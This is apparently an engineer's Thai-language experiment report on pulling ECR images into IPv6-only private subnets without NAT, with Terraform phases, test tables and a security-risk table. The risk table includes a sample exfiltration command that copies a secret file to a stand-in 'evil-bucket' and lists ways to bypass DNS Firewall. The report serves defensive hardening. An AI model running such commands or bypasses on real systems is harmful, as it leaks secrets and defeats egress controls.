# ผลการทดลอง: Pull image จาก ECR เข้า private subnet โดยไม่ใช้ NAT

- วันที่: 30 ก.ย. – 1 ต.ค. 2026
- Region: ap-southeast-1 (Singapore)
- Branch: `infra/ecr-pull-experiment` (โค้ดอยู่ใน `terraform/`)
- เป้าหมาย: ให้ instance ใน private subnet pull image จาก ECR ผ่าน Egress-only IGW และ S3 VPC endpoint โดยไม่มี NAT แล้ว SSH เข้าเครื่องจากเครื่องตัวเองผ่าน Tailscale subnet router

## Phase

1. VPC `10.10.0.0/16` + IPv6 `/56`
2. Internet Gateway + Egress-only Internet Gateway
3. Public subnet `public-a` + `rt-public` (`0.0.0.0/0 → IGW`)
4. Private subnet `private-a` (1a), `private-b` (1b) + `rt-private` (`::/0 → EIGW` อย่างเดียว)
5. S3 Gateway Endpoint ผูกกับ `rt-private`
6. Security group `sg-ts-router`, `sg-lab-instances`
7. Tailscale subnet router (EC2 + IAM role สำหรับ SSM)
8. Test instance A (1a) และ B (1b) ใน private subnet
9. ECR repo `vlab/hello`
10. SSH เข้า private instance แล้ว pull image
11. IAM role ให้ test instance ขอ ECR token เอง

## ผลที่เจอ

1. **Pull image ได้โดยไม่ต้องมี NAT** ทำได้จริงผ่าน IPv6 + EIGW
2. **Layer ของ image ไม่ได้ผ่าน S3 Gateway Endpoint**
   - ถ้าขอผ่าน registry แบบ dual-stack (`<acct>.dkr-ecr.ap-southeast-1.on.aws`) ECR จะ redirect ไปโหลด layer ที่ `prod-ap-southeast-1-starport-layer-bucket.s3.dualstack.ap-southeast-1.amazonaws.com` ซึ่งมี IPv6 docker เลยเลือกวิ่งออก EIGW
   - ถ้าขอผ่าน registry ปกติ (`<acct>.dkr.ecr.ap-southeast-1.amazonaws.com`) จะ redirect ไป `...s3.ap-southeast-1.amazonaws.com` แบบ IPv4
   - Prefix list ของ S3 endpoint (`pl-6fa54006`) เป็น **IPv4 อย่างเดียว** ทางนี้จึงใช้ได้แค่กับ S3 แบบ IPv4
   - สรุป: ถ้าจะ pull ใน subnet แบบนี้ **ใช้แค่ EIGW อย่างเดียวก็พอ** S3 endpoint ไม่ได้ถูกใช้ตอน pull
3. **`apt update` / `apt install docker.io` ใช้ได้** เพราะ mirror ของ Ubuntu บน AWS มี IPv6
4. **บริการที่ไม่มี IPv6 จะใช้ไม่ได้** เช่น GitHub (`git clone` จะไม่ผ่าน)
5. **ต้องเปิด dual-stack ใน AWS CLI** (`AWS_USE_DUALSTACK_ENDPOINT=true`) ไม่อย่างนั้น CLI จะไปหา ECR API แบบ IPv4 ซึ่งไปไม่ถึง
6. **Security group ตั้งชื่อขึ้นต้นด้วย `sg-` ไม่ได้** เพราะ AWS ห้าม เลยใส่ชื่อตามแผนไว้ใน tag `Name` แทน
7. **Router ใช้ SSM แทน SSH** จึงไม่ต้องเปิดพอร์ต 22 ให้ internet และไม่ต้องมี key pair

## Vulnerability / ความเสี่ยง

| # | ความเสี่ยง | ระดับ | เหตุผล | ทางแก้ |
|---|---|---|---|---|
| 1 | **Egress IPv6 เปิดกว้าง** (TCP 443/80 ไป `::/0`) | สูง | โค้ดในเครื่องต่อออกไปที่ไหนก็ได้ เช่น ติดต่อ C2 (reverse shell), ส่งข้อมูลออก, ขุดเหรียญ, ใช้เครื่องไปยิงคนอื่น แล้ว AWS อาจแบนบัญชี Private subnet กันได้แค่ขาเข้า กันขาออกไม่ได้ | Interface endpoint (`ecr.api`, `ecr.dkr`) + ลบ `::/0` หรือใช้ DNS Firewall |
| 2 | **S3 Gateway Endpoint ใช้ policy ตั้งต้น** (อนุญาตทุก bucket) | สูง | ส่งข้อมูลไป bucket ของคนอื่นทาง IPv4 ได้ เช่น `aws s3 cp secret.txt s3://evil-bucket/` | ใส่ endpoint policy ให้ใช้ได้แค่ `prod-ap-southeast-1-starport-layer-bucket` (ฟรี) |
| 3 | **Lab ให้ผู้ใช้รันโค้ดเอง** | สูง | ไม่ต้องเจาะเข้ามา เพราะผู้ใช้อยู่ในเครื่องอยู่แล้ว ทั้งทาง IDE, SSH และ `pip install` package ที่มีมัลแวร์ | ออกแบบโดยถือว่ามีโค้ดที่ไม่น่าไว้ใจรันอยู่ตลอดเวลา → ต้องคุมขาออก |
| 4 | **ถ้าใช้ DNS Firewall แบบ `*.amazonaws.com`** | สูง | ครอบคลุม EC2, S3, API Gateway ของ**ทุกบัญชี** AWS คนร้ายเช่า EC2 หรือสร้าง bucket เองแล้วหลบได้ ถ้าใช้ dual-stack `*.on.aws` / `*.api.aws` จะโดนบล็อกด้วย | Allowlist แบบชื่อเต็ม เช่น `568318158381.dkr-ecr.ap-southeast-1.on.aws` |
| 5 | **DNS Firewall ถูกเลี่ยงได้** | กลาง | ใส่ IP ตรง, DNS-over-HTTPS (DoH) ผ่าน 443, แก้ `/etc/hosts` | ใช้ interface endpoint (ไม่มี route ออก internet เลย) |
| 6 | **Profile `default` ในเครื่อง Pete เป็น access key ของ root** | สูง | ถ้า key หลุด ทั้งบัญชีหลุด | ลบ root access key, เปิด MFA ให้ root, ใช้ `pete-admin` แทน |
| 7 | **ECR token ต้อง copy ด้วยมือ** (ก่อน Phase 11) | ต่ำ | token อาจไปค้างใน shell history (อายุ 12 ชม.) | ใช้ `read -s` หรือ IAM role (Phase 11) |
| 8 | **Presigned URL ของ layer มี credential ชั่วคราวอยู่ข้างใน** | ต่ำ | ใครได้ URL จะโหลด layer นั้นได้ภายใน 1 ชม. | อย่าแปะ URL เต็มในที่สาธารณะ |
| 9 | **Router เป็นทางเข้าเดียว** | กลาง | ถ้า router ล่ม จะ SSH เข้า private instance ไม่ได้ | เข้า router ผ่าน SSM ได้เสมอ (break-glass) |
| 10 | **Terraform state เก็บไว้ในเครื่อง** | กลาง | ถ้าเครื่องพัง state หาย และทำงานร่วมกับเพื่อนไม่ได้ | ย้าย state ไป S3 (remote backend) |

## Test result

### Phase 8: เครือข่ายของ private instance

| เทส | คาดไว้ | Instance A (1a) | Instance B (1b) |
|---|---|---|---|
| SSH ผ่าน Tailscale router | เข้าได้ | ✅ | ✅ |
| `ip -6 addr show scope global` | มี IPv6 | ✅ `2406:da18:18c9:2f02:…` | ✅ |
| `curl -4 -m 5 https://1.1.1.1` | **ต้อง fail** (ไม่มี NAT) | ✅ timeout | ✅ |
| `curl -6 -m 5 -I https://ecr.ap-southeast-1.api.aws` | มีคำตอบ | ✅ `HTTP 404` (ถึง ECR แล้ว) | ✅ |
| `sudo apt update` | ผ่าน | ✅ | ✅ |

### Phase 9–10: ECR push / pull

| เทส | คาดไว้ | Instance A (1a) | Instance B (1b) |
|---|---|---|---|
| Push `vlab/hello:v1` จากเครื่อง Pete (endpoint ปกติ) | เห็นใน ECR | ✅ | – |
| `docker login` ด้วย token ที่ copy มา | Login Succeeded | ✅ | ✅ |
| `docker pull` ผ่าน dual-stack host | ผ่าน | ✅ | ✅ |
| `docker run` | `Hello from Docker!` | ✅ | ✅ |

### Redirect ของ layer (ดูจาก header `Location`)

| ขอผ่าน | Redirect ไป |
|---|---|
| `568318158381.dkr-ecr.ap-southeast-1.on.aws` | `…starport-layer-bucket.s3.dualstack.ap-southeast-1.amazonaws.com` |
| `568318158381.dkr.ecr.ap-southeast-1.amazonaws.com` | `…starport-layer-bucket.s3.ap-southeast-1.amazonaws.com` |

### Phase 11: IAM role

| เทส | คาดไว้ | ผล |
|---|---|---|
| ก่อน apply: `aws ecr get-login-password` | ต้อง fail | ✅ `NoCredentials` |
| หลัง apply: ผูก instance profile ให้ทั้ง A และ B | associated | ✅ |
| ขอ token เองบน instance + `docker login` + `pull` + `run` | ผ่าน | ✅ |

### ยังไม่ได้เทส

- ใช้ presigned URL แบบ IPv4 แล้ว `curl -4` บน instance เพื่อพิสูจน์ว่าโหลดผ่าน S3 Gateway Endpoint ได้จริง
- ลองรัน `get-login-password` โดยไม่ตั้ง `AWS_USE_DUALSTACK_ENDPOINT` ว่าค้างจริง
- DNS Firewall และ interface endpoint (แบบ C / แบบ B)

## ขั้นต่อไป

- เลือกระหว่างปรับของเดิม (S3 endpoint policy + สวิตช์ `enable_ecr_endpoints`) หรือสร้างชุดใหม่ที่ใช้ interface endpoint
- Golden AMI ที่ลง SkyPilot runtime ไว้แล้ว เพื่อให้เครื่องไม่ต้องโหลดอะไรจาก internet
- ย้าย Terraform state ไป S3
